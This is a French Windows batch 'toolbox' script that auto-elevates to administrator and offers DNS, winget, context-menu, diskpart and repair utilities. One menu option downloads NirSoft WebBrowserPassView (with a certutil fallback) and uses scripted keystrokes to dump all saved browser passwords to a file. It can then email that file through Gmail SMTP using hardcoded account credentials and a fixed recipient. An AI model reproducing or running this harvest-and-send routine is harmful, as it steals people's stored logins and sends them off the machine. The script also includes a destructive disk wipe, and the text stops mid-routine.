@echo off
setlocal EnableExtensions EnableDelayedExpansion
if defined MSYSTEM ("%ComSpec%" /c "%~f0" & exit /b)
if not defined CMDCMDLINE ("%ComSpec%" /c "%~f0" & exit /b)
chcp 65001 >nul
title Boite a Scripts Windows - By ALEEXLEDEV (v1.0)
color 0B

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Ce script requiert des privileges administrateur.
    echo Demande d'elevation en cours...
    timeout /t 2 >nul
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:menu_principal
set "opts=Gestionnaire DNS Cloudflare;Mises a jour des application windows;Menu contextuel Windows 11;Formatage avec DISKPART;Export mots de passe navigateurs;Voir les outils systeme avances"
call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "%opts%"
set "main_choice=%errorlevel%"

if "%main_choice%"=="1" goto dns_manager
if "%main_choice%"=="2" goto winget_manager
if "%main_choice%"=="3" goto context_menu
if "%main_choice%"=="4" goto disk_manager
if "%main_choice%"=="5" goto sys_browser_passwords
if "%main_choice%"=="6" goto system_tools
if "%main_choice%"=="0" goto exit_script
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE DNS CLOUDFLARE
REM ===================================================================
:dns_manager
set "opts=Installation DNS Cloudflare (IPv4 + IPv6);Installation DNS Cloudflare (IPv4 seulement);Restauration des DNS par defaut;Affichage de la configuration actuelle"
call :DynamicMenu "GESTIONNAIRE DNS CLOUDFLARE" "%opts%"
set "dns_choice=%errorlevel%"

if "%dns_choice%"=="1" goto install_cloudflare_full
if "%dns_choice%"=="2" goto install_cloudflare_ipv4
if "%dns_choice%"=="3" goto restore_dns
if "%dns_choice%"=="4" goto show_dns_config
if "%dns_choice%"=="0" goto menu_principal
goto dns_manager

:install_cloudflare_full
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (IPv4 + IPv6)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Cloudflare IPv4...
netsh interface ip set dns "%interface%" static 1.1.1.1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2

echo Configuration des DNS Cloudflare IPv6...
netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111
netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo   IPv6 - Primaire: 2606:4700:4700::1111
echo   IPv6 - Secondaire: 2606:4700:4700::1001
echo.
pause
goto dns_manager

:install_cloudflare_ipv4
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (IPv4 seulement)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Cloudflare IPv4...
netsh interface ip set dns "%interface%" static 1.1.1.1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES ! 
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo.
pause
goto dns_manager

:restore_dns
cls
echo ================================================
echo     RESTAURATION DNS PAR DEFAUT
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Restauration des DNS automatiques IPv4...
netsh interface ip set dns "%interface%" dhcp

echo Restauration des DNS automatiques IPv6...
netsh interface ipv6 set dns "%interface%" dhcp

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     DNS RESTAURES AVEC SUCCES !
echo ================================================
echo.
pause
goto dns_manager

:show_dns_config
cls
echo ================================================
echo     CONFIGURATION DNS ACTUELLE
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau: %interface%
echo.
echo Configuration DNS IPv4:
netsh interface ip show dns "%interface%"
echo.
echo Configuration DNS IPv6:
netsh interface ipv6 show dns "%interface%"
echo.
pause
goto dns_manager

:get_interface
set "interface="
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%b"=="Connecté" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%b"=="Connected" (
        set "interface=%%d"
        goto :interface_found
    )
)
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%c"=="Dédié" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%c"=="Dedicated" (
        set "interface=%%d"
        goto :interface_found
    )
)
:interface_found
if defined interface (
    set "interface=%interface: =%"
    set "interface=%interface:"=%"
)
goto :eof

REM ===================================================================
REM                   WINGET - Mises ÃƒÂ  jour des application windows
REM ===================================================================
:winget_manager
set "opts=Mettre a jour une application (liste et choix);Mettre a jour toutes les applications"
call :DynamicMenu "WINGET - MISES A JOUR APPLICATIONS" "%opts%"
set "winget_choice=%errorlevel%"

if "%winget_choice%"=="1" goto update_single
if "%winget_choice%"=="2" goto update_all
if "%winget_choice%"=="0" goto menu_principal
goto winget_manager

:update_single
cls
echo ================================================
echo     LISTE DES APPLICATIONS A METTRE A JOUR
echo ================================================
echo.
winget update
echo.
echo Copiez l'ID de l'application que vous souhaitez mettre a jour.
echo.
set /p app_id=Entrez l'ID de l'application: 

if "%app_id%"=="" (
    echo Aucun ID saisi.
    pause
    goto winget_manager
)

echo.
echo Mise a jour de %app_id% en cours...
winget update --id %app_id% --accept-package-agreements --accept-source-agreements
echo.
echo Termine.
pause
goto winget_manager

:update_all
cls
echo ================================================
echo     MISE A JOUR DE TOUTES LES APPLICATIONS
echo ================================================
echo.
winget update --all --accept-package-agreements --accept-source-agreements
echo.
echo Toutes les mises a jour ont ete appliquees.
pause
goto winget_manager

REM ===================================================================
REM                    MENU CONTEXTUEL WINDOWS 11
REM ===================================================================
:context_menu
set "opts=Activer le menu contextuel classique;Restaurer le menu contextuel moderne"
call :DynamicMenu "MENU CONTEXTUEL WINDOWS 11" "%opts%"
set "ctx_choice=%errorlevel%"

if "%ctx_choice%"=="1" goto activate_classic
if "%ctx_choice%"=="2" goto restore_modern
if "%ctx_choice%"=="0" goto menu_principal
goto context_menu

:activate_classic
cls
echo.
echo Activation du menu contextuel classique...
echo.
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
echo Modification du registre terminee.
echo.
echo IMPORTANT : Un redemarrage de l'Explorateur Windows est necessaire.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel classique active avec succes !
) else (
    echo.
    echo Menu contextuel classique sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

:restore_modern
cls
echo.
echo Restauration du menu contextuel moderne...
echo.
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f >nul 2>&1
echo Modification du registre terminee.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel moderne restaure avec succes !
) else (
    echo.
    echo Menu contextuel moderne sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

REM ===================================================================
REM                    GESTIONNAIRE DE DISQUES - FORMATAGE AVEC DISKPART
REM ===================================================================
:disk_manager
cls
color 0A
echo.
echo =============================================================
echo                       DISKPART
echo =============================================================
echo.
echo Analyse des disques disponibles...
echo.

set "disk_opts="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | ForEach-Object { '{0}: {1} ({2:N0} GB)' -f $_.Number, $_.FriendlyName, ($_.Size/1GB) }"') do (
    if defined disk_opts (set "disk_opts=!disk_opts!;%%D") else (set "disk_opts=%%D")
)

if not defined disk_opts (
    echo [!] Aucun disque detecte.
    pause
    goto menu_principal
)

call :DynamicMenu "CHOISISSEZ LE DISQUE A FORMATER" "%disk_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto menu_principal

rem Recuperer le numero du disque a partir du choix
set /a idx=1
set "disk_num="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
    if !idx! equ %res% set "disk_num=%%D"
    set /a idx+=1
)

if not defined disk_num goto disk_manager




    echo Ã¢ÂÅ’ Erreur : Veuillez entrer un numero valide !

:disk_format_choice
set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
set "format_choice=%errorlevel%"

if "%format_choice%"=="0" goto menu_principal
if "%format_choice%"=="1" set fs_type=NTFS
if "%format_choice%"=="2" set fs_type=FAT32
if "%format_choice%"=="3" set fs_type=exFAT
if "%format_choice%"=="4" set fs_type=ReFS

if not defined fs_type goto disk_format_choice

cls
echo.
echo =============================================================
echo                       CONFIRMATION
echo =============================================================
echo.
echo Vous allez formater le DISQUE %disk_num%
echo Format selectionne : %fs_type%
echo.
echo ATTENTION: TOUTES LES DONNEES SERONT DEFINITIVEMENT EFFACEES !
echo.
echo Tapez 'OUI' en majuscules pour confirmer (ou autre pour annuler) :
set /p confirmation=Confirmation: 

if not "%confirmation%"=="OUI" (
    echo.
    echo Ã¢ÂÅ’ Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto disk_manager
)

echo.
echo =============================================================
echo Preparation du formatage...
echo =============================================================
echo.

set script_temp=%temp%\diskpart_script.txt

(
    echo select disk %disk_num%
    echo clean
    echo create partition primary
    echo format fs=%fs_type% quick
    echo assign
    echo exit
) > "%script_temp%"

echo Execution des commandes diskpart...
echo.
diskpart /s "%script_temp%"

set result=%errorLevel%

del "%script_temp%" >nul 2>&1

echo.
echo =============================================================
if %result% equ 0 (
    echo.
    echo Ã¢Å“â€¦ Formatage termine avec succes !
    echo.
    echo Le disque %disk_num% a ete :
    echo   - Nettoye completement
    echo   - Partitionne en partition primaire
    echo   - Formate en %fs_type%
    echo   - Une lettre de lecteur lui a ete assignee
    echo.
) else (
    echo.
    echo Ã¢ÂÅ’ Une erreur s'est produite pendant le formatage.
    echo Verifiez que le disque existe et n'est pas protege.
    echo.
)
echo =============================================================
echo.

set /p disk_choice=Voulez-vous formater un autre disque ? (O/N): 
if /i "%disk_choice%"=="O" goto disk_manager
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE D'ECRAN TACTILE
REM ===================================================================
:touch_screen_manager
set "opts=Redemarrer le pilote tactile;Desactiver le pilote tactile;Activer le pilote tactile"
call :DynamicMenu "GESTION ECRAN TACTILE" "%opts%"
set "touch_choice=%errorlevel%"

if "%touch_choice%"=="1" goto touch_restart
if "%touch_choice%"=="2" goto touch_disable
if "%touch_choice%"=="3" goto touch_enable
if "%touch_choice%"=="0" goto system_tools
goto touch_screen_manager

:touch_restart
cls
echo.
echo === Redemarrage du pilote d'ecran tactile ===
echo.

echo Redemarrage du service TabletInputService...
net stop TabletInputService >nul 2>&1
timeout /t 2 /nobreak >nul
net start TabletInputService >nul 2>&1

echo Redemarrage du service HidServ...
net stop HidServ >nul 2>&1
timeout /t 2 /nobreak >nul
net start HidServ >nul 2>&1

echo.
echo Desactivation/Reactivation du peripherique tactile via PowerShell...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }; Start-Sleep -Seconds 2; foreach ($device in $touchDevices) { Write-Host 'Reactivation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo Redemarrage du processus dwm.exe (Desktop Window Manager)...
taskkill /f /im dwm.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo.
echo === Redemarrage termine ===
echo Testez votre ecran tactile maintenant.
echo.
pause
goto touch_screen_manager

:touch_disable
cls
echo.
echo === Desactivation du pilote tactile ===
echo.

echo Arret du service TabletInputService...
net stop TabletInputService >nul 2>&1

echo Desactivation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo === Pilote tactile desactive ===
echo Le tactile restera desactive jusqu'a reactivation manuelle.
echo.
pause
goto touch_screen_manager

:touch_enable
cls
echo.
echo === Activation du pilote tactile ===
echo.

echo Activation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Activation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo Demarrage du service TabletInputService...
net start TabletInputService >nul 2>&1

echo.
echo === Pilote tactile active ===
echo.
pause
goto touch_screen_manager

REM ===================================================================
REM                    OUTILS SYSTEME AVANCES
REM ===================================================================
:system_tools
set "opts=[--- VERIFICATIONS D INTEGRITE SYSTEME ---];SFC (Scannow)~Verifie et repare les fichiers systeme Windows corrompus;DISM Check~Verifie integrite de image de Windows sans la modifier;DISM Restore~Repare image Windows a aide de Windows Update;CHKDSK~Analyse avancee des erreurs sur tous les lecteurs;[--- NETTOYAGE ET OPTIMISATION ---];Nettoyage de disque~Lance utilitaire classique de nettoyage de Windows;Nettoyage Temp/Cache~Supprime les fichiers temporaires et le cache systeme;Nettoyage Registre~Optimise et nettoie les entrees invalides du Registre;[--- DISQUE DUR ---];BitLocker (Verification/Dechiffrement)~Verifie etat de chiffrement de vos disques;[--- OUTILS RESEAU ---];Options DNS~Change facilement les serveurs DNS (Cloudflare, Google, etc.);ipconfig /all~Affiche la configuration detaillee de toutes les cartes reseau;Redemarrer cartes reseau~Desactive puis reactive les adaptateurs Wi-Fi et Ethernet;Reparation reseau~Renouvelle adresse IP et vide le cache DNS;[--- UTILITAIRES ET EXTRAS ---];Pilotes installes~Exporte la liste complete des pilotes installes sur le PC;Reparation Windows Update~Outil de reparation des fichiers de mise a jour;Rapport systeme~Genere un diagnostic hardware et reseau sur le Bureau;Reset Windows Update~Redemarre les services lies a Windows Update;Gestion utilisateurs locaux~Cree, modifie ou supprime des comptes locaux Windows;[--- MOT DE PASSE ---];Mots de passe Wi-Fi~Affiche ou sauvegarde les mots de passe des reseaux connus;Notes: Debloquer session~Affiche la procedure de recuperation de compte bloque;[--- MATERIEL ---];Gestion ecran tactile~Desactive, active ou redemarre ecran tactile"
call :DynamicMenu "OUTILS SYSTEME AVANCES" "%opts%"
set "sys_choice=%errorlevel%"

if "%sys_choice%"=="1" goto sys_sfc
if "%sys_choice%"=="2" goto sys_dism_check
if "%sys_choice%"=="3" goto sys_dism_restore
if "%sys_choice%"=="4" goto sys_chkdsk
if "%sys_choice%"=="5" goto sys_cleanmgr
if "%sys_choice%"=="6" goto sys_temp_cleanup
if "%sys_choice%"=="7" goto sys_registry_cleanup
if "%sys_choice%"=="8" goto sys_bitlocker_check
if "%sys_choice%"=="9" goto sys_dns_options
if "%sys_choice%"=="10" goto sys_ipconfig
if "%sys_choice%"=="11" goto sys_restart_network
if "%sys_choice%"=="12" goto sys_repair_network
if "%sys_choice%"=="13" goto sys_drivers
if "%sys_choice%"=="14" goto sys_windows_update
if "%sys_choice%"=="15" goto sys_report
if "%sys_choice%"=="16" goto sys_reset_windows_update
if "%sys_choice%"=="17" goto um_menu
if "%sys_choice%"=="18" goto sys_wifi_passwords
if "%sys_choice%"=="19" goto sys_unlock_notes
if "%sys_choice%"=="20" goto touch_screen_manager
if "%sys_choice%"=="0" goto menu_principal
goto system_tools

:: ===============================================
:: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
:: ===============================================
:sys_browser_passwords
cls
color 0A
echo ===============================================
echo   Export mots de passe navigateurs (Nirsoft)
echo ===============================================
echo.

set "WBPV=%~dp0WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
set "EMAIL=REMOVED_SMTP_EMAIL"
set "DOWNLOADED=0"
set "SMTP_USER=REMOVED_SMTP_EMAIL"
set "SMTP_PASS=REMOVED_SMTP_PASS"

:bpv_menu
set "opts=Enregistrement local uniquement;Enregistrement et envoi par email"
call :DynamicMenu "WEBBROWSERPASSVIEW - EXPORT" "%opts%"
set "bpv_choice=%errorlevel%"

if "%bpv_choice%"=="1" goto EXPORT
if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
if "%bpv_choice%"=="0" goto system_tools
goto bpv_menu

:EXPORT
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

if exist "%OUTPUT%" (
  echo Termine. Fichier sauvegarde: %OUTPUT%
  echo.
  echo Retour au menu precedent dans 2 secondes...
  timeout /t 2 /nobreak >nul
  goto system_tools
) else (
  echo ERREUR: Le fichier n'a pas ete cree.
  pause
  goto bpv_menu
)

:EXPORT_AND_SEND
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

if not exist "%OUTPUT%" (
  echo ERREUR: Le fichier n'a pas ete cree.
  if "%DOWNLOADED%"=="1" (
    del /F /Q "%WBPV%" >nul 2>&1
    if exist "%WBPV%" (
      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
    )
  )
  pause
  goto bpv_menu
)

echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...

powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo.
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

echo.
echo Fermeture automatique dans 2 secondes...
timeout /t 2 /nobreak >nul
goto system_tools

:GET_UNIQUE_FILENAME
set "BASE=%~dp0passwords_export"
set "EXT=.txt"
set "COUNTER=0"
set "UNIQUE_FILE=%BASE%%EXT%"

:CHECK_FILE
if exist "%UNIQUE_FILE%" (
  set /a COUNTER+=1
  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
  goto CHECK_FILE
)
goto :eof

:sys_sfc
cls
echo ==============================================================
echo     Analyse des fichiers systeme (SFC /scannow)
echo ==============================================================
echo.
echo Cette operation peut prendre plusieurs minutes.
echo.
powershell -NoProfile -Command "Write-Host '   Appuyez sur [ENTREE] pour Lancer ou [ECHAP] pour Annuler...' -ForegroundColor Yellow; $Host.UI.RawUI.FlushInputBuffer(); while($true){$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); $v=$k.VirtualKeyCode; if($v -eq 27){exit 1}elseif($v -eq 13){exit 0}}"
if %errorlevel% neq 0 (
    echo.
    echo [X] Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto system_tools
)
echo.
echo Lancement de l'analyse, veuillez patienter...
sfc /scannow
pause
goto system_tools

:sys_dism_check
cls
echo ==============================================================
echo     Verification rapide de l'etat de Windows (DISM /CheckHealth)
echo ==============================================================
echo.
echo Cette operation est tres rapide et va verifier si l'image est corrompue.
echo.
powershell -NoProfile -Command "Write-Host '   Appuyez sur [ENTREE] pour Lancer ou [ECHAP] pour Annuler...' -ForegroundColor Yellow; $Host.UI.RawUI.FlushInputBuffer(); while($true){$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); $v=$k.VirtualKeyCode; if($v -eq 27){exit 1}elseif($v -eq 13){exit 0}}"
if %errorlevel% neq 0 (
    echo.
    echo [X] Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto system_tools
)
echo.
echo Lancement de la verification...
dism /online /cleanup-image /checkhealth
pause
goto system_tools

:sys_dism_restore
cls
echo ==============================================================
echo     Restauration de l'etat de Windows (DISM /RestoreHealth)
echo ==============================================================
echo.
echo Cette operation peut prendre du temps (connexion Internet requise).
echo.
powershell -NoProfile -Command "Write-Host '   Appuyez sur [ENTREE] pour Lancer ou [ECHAP] pour Annuler...' -ForegroundColor Yellow; $Host.UI.RawUI.FlushInputBuffer(); while($true){$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); $v=$k.VirtualKeyCode; if($v -eq 27){exit 1}elseif($v -eq 13){exit 0}}"
if %errorlevel% neq 0 (
    echo.
    echo [X] Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto system_tools
)
echo.
echo Lancement de la restauration, veuillez patienter...
dism /online /cleanup-image /restorehealth
pause
goto system_tools

:sys_dns_options
ipconfig /flushdns >nul
set "opts=Utiliser DNS Google (8.8.8.8);Utiliser DNS Cloudflare (1.1.1.1);Restaurer les DNS par defaut;Saisir vos DNS personnalises"
call :DynamicMenu "OPTIONS DNS" "%opts%"
set "dns_opt_choice=%errorlevel%"

if "%dns_opt_choice%"=="1" goto set_google_dns
if "%dns_opt_choice%"=="2" goto set_cloudflare_dns
if "%dns_opt_choice%"=="3" goto restore_dns_default
if "%dns_opt_choice%"=="4" goto custom_dns
if "%dns_opt_choice%"=="0" goto system_tools
if "%dns_opt_choice%"=="5" goto system_tools
goto sys_dns_options

:set_google_dns
echo Sauvegarde des parametres DNS actuels...
netsh interface ip show config name="Wi-Fi" | findstr "Statically Configured DNS Servers" > %SystemRoot%\Temp\wifi_dns_backup.txt 2>nul
netsh interface ip show config name="Ethernet" | findstr "Statically Configured DNS Servers" > %SystemRoot%\Temp\ethernet_dns_backup.txt 2>nul

echo Application des DNS Google...
netsh interface ip set dns name="Wi-Fi" static 8.8.8.8 primary 2>nul
netsh interface ip add dns name="Wi-Fi" 8.8.4.4 index=2 2>nul
netsh interface ip set dns name="Ethernet" static 8.8.8.8 primary 2>nul
netsh interface ip add dns name="Ethernet" 8.8.4.4 index=2 2>nul

echo DNS Google appliques avec succes.
pause
goto system_tools

:set_cloudflare_dns
echo Sauvegarde des parametres DNS actuels...
netsh interface ip show config name="Wi-Fi" | findstr "Statically Configured DNS Servers" > %SystemRoot%\Temp\wifi_dns_backup.txt 2>nul
netsh interface ip show config name="Ethernet" | findstr "Statically Configured DNS Servers" > %SystemRoot%\Temp\ethernet_dns_backup.txt 2>nul

echo Application des DNS Cloudflare...
netsh interface ip set dns name="Wi-Fi" static 1.1.1.1 primary 2>nul
netsh interface ip add dns name="Wi-Fi" 1.0.0.1 index=2 2>nul
netsh interface ip set dns name="Ethernet" static 1.1.1.1 primary 2>nul
netsh interface ip add dns name="Ethernet" 1.0.0.1 index=2 2>nul

echo DNS Cloudflare appliques avec succes.
pause
goto system_tools

:restore_dns_default
cls
echo ======================================================
echo        RESTAURATION DES PARAMETRES DNS D'ORIGINE
echo ======================================================
echo.

echo [Etape 1] Configuration du DNS Wi-Fi en automatique (DHCP)...
netsh interface ip set dns name="Wi-Fi" source=dhcp >nul 2>&1
if %errorlevel% neq 0 (
    echo [ECHEC] Impossible de restaurer le DNS Wi-Fi. Verifiez manuellement.
) else (
    echo [OK] DNS Wi-Fi retabli avec succes.
)

echo.
echo [Etape 2] Configuration du DNS Ethernet en automatique (DHCP)...
netsh interface ip set dns name="Ethernet" source=dhcp >nul 2>&1
if %errorlevel% neq 0 (
    echo [ECHEC] Impossible de restaurer le DNS Ethernet. Verifiez manuellement.
) else (
    echo [OK] DNS Ethernet retabli avec succes.
)

echo.
echo ------------------------------------------------------
echo Restauration des parametres DNS terminee.
echo ------------------------------------------------------
pause
goto system_tools

:custom_dns
cls
echo ===============================================
echo           Saisir vos DNS personnalises
echo ===============================================

:get_custom_dns
echo.
set /p customDNS1=DNS primaire: 
set /p customDNS2=DNS secondaire (optionnel): 

cls
echo ===============================================
echo           Validation des adresses DNS...
echo ===============================================
ping -n 1 %customDNS1% >nul
if errorlevel 1 (
    echo [!] ERREUR: Le DNS primaire "%customDNS1%" est injoignable.
    echo Veuillez saisir une adresse DNS valide.
    pause
    cls
    goto get_custom_dns
)

